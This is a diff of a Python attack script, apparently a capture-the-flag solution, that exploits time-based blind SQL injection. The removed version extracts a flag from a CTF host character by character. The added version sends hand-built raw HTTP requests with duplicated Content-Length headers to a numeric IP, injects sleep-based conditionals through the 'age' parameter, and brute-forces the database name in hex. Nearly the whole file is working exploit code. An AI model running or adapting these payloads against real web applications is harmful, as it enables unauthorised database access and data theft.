@@ -1,29 +1,56 @@
 import requests
-def judge(index,guess):
-    url1="http://0.ctf.rois.io:20009/?id=1%20union%20select%20if(ascii(substr((select%20flag%20from%20flag),"
-    url2=",1))%3d"
-    url3=',sleep(6),0)#'
-    rurl=url1+str(index)+url2+str(guess)+url3
-    try :
-        requests.get(rurl,timeout=6)
-        print('第'+str(index)+'字母不是'+chr(guess))
-        return 0
-    except requests.exceptions.ReadTimeout:
-        print('success,'+'第'+str(index)+'字母是'+chr(guess))
-        return 1
-    
+import hackhttp 
+import urllib
+import socket
 
-result='ROIS'
-index=1+4
-while 1:
-    alpha=0
+ip = '111.186.57.61'
+port = 10601
+
+def send_raw(raw):
+
+    try:
+        with socket.create_connection((ip, port), timeout=2) as conn:
+            conn.send(bytes(raw,encoding="ascii"))
+            res = conn.recv(10240).decode()
+
+    except:
+        return True
     
-    for i in range(32,128):
-        if judge(index,i):
-            alpha=i
-            result+=chr(i)
+    return False
+
+
+
+def rawhttp(sql):
+    sql=urllib.parse.quote(sql)
+    burp0_url = "http://111.186.57.61:10601/?age={}".format(sql)
+    raw='''GET /?age={} HTTP/1.1
+Host: 111.186.57.61:10601
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Length: 0
+Content-Length: 0
+
+'''.format(sql).replace("\n","\r\n")
+    return send_raw(raw)
+
+
+l='0123456789ABCDEF'
+result=""
+for j in range(10):
+    for i in l:
+        sql="if((select substr(hex(database()),{},1))=char({}),sleep(10),0)".format(j+1,ord(i))
+        if rawhttp(sql):
+            result+=i
+            print(result)
             break
-    if alpha==0:
-        print('爆破完成:'+result)
-        break
-    index+=1
+        else :
+            print("第{}个字符不是{}".format(j+1,i))
+        
+
+
+
